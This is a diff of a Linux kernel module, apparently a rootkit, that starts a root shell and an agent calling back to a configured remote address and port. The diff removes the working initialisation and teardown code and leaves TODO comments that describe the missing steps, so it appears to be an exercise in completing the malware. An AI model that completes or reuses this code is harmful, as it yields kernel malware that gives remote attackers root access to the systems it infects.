@@ -1,11 +1,11 @@
 // SPDX-License-Identifier: GPL-2.0
 #include <linux/err.h>
 #include <linux/errno.h>
-#include <linux/inet.h>
 #include <linux/init.h>
 #include <linux/module.h>
 
 #include "agent.h"
+#include "ipv4.h"
 #include "root_shell.h"
 
 static unsigned short peer_port;
@@ -33,37 +33,22 @@ static int __init rk_init(void)
 	__be32 peer_address;
 	int error;
 
-	{
-		const char *end;
-
-		if (!in4_pton(peer_address_text, -1, (u8 *)&peer_address,
-			      -1, &end) || *end || !peer_address)
-			return -EINVAL;
-	}
-	if (!peer_port || !retry_base_ms ||
+	error = rk_ipv4_parse(peer_address_text, &peer_address);
+	if (error || !peer_port || !retry_base_ms ||
 	    retry_base_ms > retry_max_ms || retry_max_ms > 5000)
 		return -EINVAL;
 
-	error = rk_root_shell_init(&shell, 60000);
-	if (error)
-		return error;
+	// TODO: Initialize the root shell with a 60-second timeout.
+	// Then start the agent, passing the shell pointer.
+	// If agent_start fails, stop the shell before returning.
 
-	error = rk_agent_start(&agent, peer_address, peer_port,
-			       retry_base_ms, retry_max_ms, &shell);
-	if (error)
-		goto stop_shell;
-
-	return 0;
-
-stop_shell:
-	rk_root_shell_stop(&shell);
-	return error;
+	return -ENOSYS;
 }
 
 static void __exit rk_exit(void)
 {
-	rk_agent_stop(&agent);
-	rk_root_shell_stop(&shell);
+	// TODO: Stop the agent first, then stop the shell.
+	// Order matters: the agent may have an active shell session.
 }
 
 module_init(rk_init);
